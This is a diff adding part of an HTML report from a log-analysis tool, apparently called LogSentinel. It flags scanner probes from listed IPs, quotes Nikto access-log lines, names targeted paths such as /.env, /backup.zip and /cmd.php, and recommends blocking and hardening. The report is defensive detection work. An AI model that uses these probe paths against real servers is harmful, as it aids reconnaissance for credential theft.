+          <div style="margin-bottom:8px;"><div style="background:#0f172a;color:#67e8f9;font-family:monospace;font-size:11px;padding:4px 8px;border-radius:4px;margin:2px 0;word-break:break-all;">404 /dir0</div><div style="background:#0f172a;color:#67e8f9;font-family:monospace;font-size:11px;padding:4px 8px;border-radius:4px;margin:2px 0;word-break:break-all;">404 /dir1</div><div style="background:#0f172a;color:#67e8f9;font-family:monospace;font-size:11px;padding:4px 8px;border-radius:4px;margin:2px 0;word-break:break-all;">404 /dir2</div><div style="background:#0f172a;color:#67e8f9;font-family:monospace;font-size:11px;padding:4px 8px;border-radius:4px;margin:2px 0;word-break:break-all;">404 /dir3</div></div>
+          <div style="background:#eff6ff;border-radius:6px;padding:8px 12px;font-size:12px;color:#1d4ed8;">
+            <strong>→ Recommendation:</strong> Block 198.54.117.200 at WAF. Paths probed: /dir20, /dir17, /dir19, /dir8, /dir14, /dir24, /dir4, /file1.php. Harden directory listing settings.
+          </div>
+          <div style="font-size:11px;color:#6b7280;margin-top:6px;">Source IP: <code>198.54.117.200</code></div>
+        </div>
+        <div style="border:1px solid #e5e7eb;border-left:4px solid #ea580c;border-radius:10px;padding:1.25rem 1.5rem;margin-bottom:1rem;background:#fff;">
+          <div style="display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:8px;margin-bottom:10px;">
+            <div>
+              <span style="font-size:12px;color:#6b7280;">#14 &nbsp;·&nbsp; SUSPICIOUS PATH PROBE</span>
+              <div style="font-size:14px;font-weight:600;color:#111827;margin-top:3px;">IP 192.241.208.18 probed 16 sensitive paths: /phpinfo.php, /backup.zip, /.env, /cmd.php.</div>
+            </div>
+            <div style="text-align:right;flex-shrink:0"><span style="background:#ea580c;color:#fff;padding:2px 9px;border-radius:4px;font-size:11px;font-weight:700;">MEDIUM</span><div style="font-size:11px;color:#6b7280;margin-top:4px;">Count: 16</div></div>
+          </div>
+          <div style="margin-bottom:8px;"><div style="background:#0f172a;color:#67e8f9;font-family:monospace;font-size:11px;padding:4px 8px;border-radius:4px;margin:2px 0;word-break:break-all;">192.241.208.18 - - [01/May/2026:09:01:05 +0000] "GET /admin HTTP/1.1" 200 312 "-" "Mozilla/5.0 (compatible; Nikto/2.1.6)</div><div style="background:#0f172a;color:#67e8f9;font-family:monospace;font-size:11px;padding:4px 8px;border-radius:4px;margin:2px 0;word-break:break-all;">192.241.208.18 - - [01/May/2026:09:54:09 +0000] "GET /phpmyadmin HTTP/1.1" 404 312 "-" "Mozilla/5.0 (compatible; Nikto/2</div><div style="background:#0f172a;color:#67e8f9;font-family:monospace;font-size:11px;padding:4px 8px;border-radius:4px;margin:2px 0;word-break:break-all;">192.241.208.18 - - [01/May/2026:09:12:02 +0000] "GET /wp-admin HTTP/1.1" 404 312 "-" "Mozilla/5.0 (compatible; Nikto/2.1</div><div style="background:#0f172a;color:#67e8f9;font-family:monospace;font-size:11px;padding:4px 8px;border-radius:4px;margin:2px 0;word-break:break-all;">192.241.208.18 - - [01/May/2026:09:50:50 +0000] "GET /pma HTTP/1.1" 200 312 "-" "Mozilla/5.0 (compatible; Nikto/2.1.6)"</div></div>
+          <div style="background:#eff6ff;border-radius:6px;padding:8px 12px;font-size:12px;color:#1d4ed8;">
+            <strong>→ Recommendation:</strong> Remove or protect admin/config paths. Return 404 for hidden paths (not 403 — 403 confirms existence). Enable authentication on admin panels.
+          </div>
+          <div style="font-size:11px;color:#6b7280;margin-top:6px;">Source IP: <code>192.241.208.18</code></div>
+        </div>
+  </div>
+
+  <div class="sec"><h2>Top Source IPs</h2><table><thead><tr><th>IP Address</th><th>Total Requests</th></tr></thead><tbody><tr><td style="padding:7px 12px;font-family:monospace;">178.62.70.107</td><td style="padding:7px 12px;text-align:center;">600</td></tr><tr><td style="padding:7px 12px;font-family:monospace;">45.77.200.13</td><td style="padding:7px 12px;text-align:center;">64</td></tr><tr><td style="padding:7px 12px;font-family:monospace;">172.16.8.44</td><td style="padding:7px 12px;text-align:center;">62</td></tr><tr><td style="padding:7px 12px;font-family:monospace;">203.45.12.88</td><td style="padding:7px 12px;text-align:center;">62</td></tr><tr><td style="padding:7px 12px;font-family:monospace;">91.203.5.11</td><td style="padding:7px 12px;text-align:center;">57</td></tr><tr><td style="padding:7px 12px;font-family:monospace;">103.21.45.9</td><td style="padding:7px 12px;text-align:center;">55</td></tr><tr><td style="padding:7px 12px;font-family:monospace;">198.54.117.200</td><td style="padding:7px 12px;text-align:center;">40</td></tr><tr><td style="padding:7px 12px;font-family:monospace;">185.220.101.45</td><td style="padding:7px 12px;text-align:center;">19</td></tr><tr><td style="padding:7px 12px;font-family:monospace;">192.241.208.18</td><td style="padding:7px 12px;text-align:center;">16</td></tr><tr><td style="padding:7px 12px;font-family:monospace;">45.33.32.156</td><td style="padding:7px 12px;text-align:center;">8</td></tr></tbody></table></div>
+
+  <footer>LogSentinel v1.0 &nbsp;|&nbsp; Built by <strong>Daksh Shah</strong> &nbsp;|&nbsp; github.com/daksh-shah9135/logsentinel</footer>
+</div></body></html>
